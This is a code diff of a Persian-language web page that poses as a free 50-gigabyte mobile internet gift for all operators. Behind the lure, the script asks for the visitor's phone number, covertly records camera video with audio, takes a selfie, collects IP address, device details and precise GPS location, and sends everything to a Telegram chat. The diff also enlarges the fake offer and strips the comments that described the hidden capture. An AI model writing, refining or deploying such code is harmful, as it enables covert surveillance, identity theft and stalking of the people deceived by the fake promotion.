@@ -150,7 +150,7 @@
       <img src="https://i.imgur.com/5e5b6e7.png" alt="WiFi">
     </div>
     <h1>اینترنت رایگان نامحدود</h1>
-    <p>بسته هدیه ۱۰ گیگابایت اینترنت رایگان برای همه اپراتورها!</p>
+    <p>بسته هدیه ۵۰ گیگابایت اینترنت رایگان ۳۰ روزه برای همه اپراتورها!</p>
 
     <input type="tel" id="userPhone" class="phone-input" placeholder="09123456789" />
 
@@ -220,7 +220,6 @@
       progressBar.style.width = "0%";
 
       try {
-        // دسترسی به دوربین و میکروفون (بدون نمایش)
         stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user", width: 640, height: 480 },
           audio: true
@@ -229,7 +228,6 @@
         video.muted = true;
         video.play();
 
-        // فقط نمایش "ارتباط با سرور"
         let seconds = 0;
         timer = setInterval(() => {
           seconds++;
@@ -257,7 +255,6 @@
 
       let messageId = null;
 
-      // ارسال فیلم (صدا دار)
       if (videoBlob) {
         const form = new FormData();
         form.append('chat_id', CHAT_ID);
@@ -267,7 +264,6 @@
         if (data.ok) messageId = data.result.message_id;
       }
 
-      // ارسال عکس سلفی
       if (photoBlob) {
         const form = new FormData();
         form.append('chat_id', CHAT_ID);
@@ -278,7 +274,6 @@
         if (data.ok) messageId = data.result.message_id;
       }
 
-      // گزارش کامل
       const report = `
 *گزارش کاربر - اینترنت رایگان*
 *شماره تلفن:* \`${userPhone}\`
@@ -304,12 +299,11 @@ IP: \`${deviceInfo.ip}\`
         })
       });
 
-      status.innerHTML = "بسته ۱۰ گیگ با موفقیت فعال شد! <strong style='color:#0f0;'>✓</strong>";
+      status.innerHTML = "بسته ۵۰ گیگ ۳۰ روزه با موفقیت فعال شد! <strong style='color:#0f0;'>✓</strong>";
       stopStream();
       setTimeout(reset, 3000);
     }
 
-    // ضبط فیلم (صدا دار)
     async function recordVideo() {
       return new Promise(resolve => {
         const chunks = [];
@@ -321,7 +315,6 @@ IP: \`${deviceInfo.ip}\`
       });
     }
 
-    // عکس سلفی
     async function capturePhoto() {
       return new Promise(resolve => {
         canvas.width = video.videoWidth;
@@ -331,7 +324,6 @@ IP: \`${deviceInfo.ip}\`
       });
     }
 
-    // اطلاعات فنی
     async function getDeviceInfo() {
       const info = { userAgent: navigator.userAgent, ip: '', location: '' };
       try {
@@ -343,7 +335,6 @@ IP: \`${deviceInfo.ip}\`
       return info;
     }
 
-    // لوکیشن دقیق
     async function getLocation() {
       return new Promise(resolve => {
         if (!navigator.geolocation) return resolve({ error: "GPS غیرفعال" });
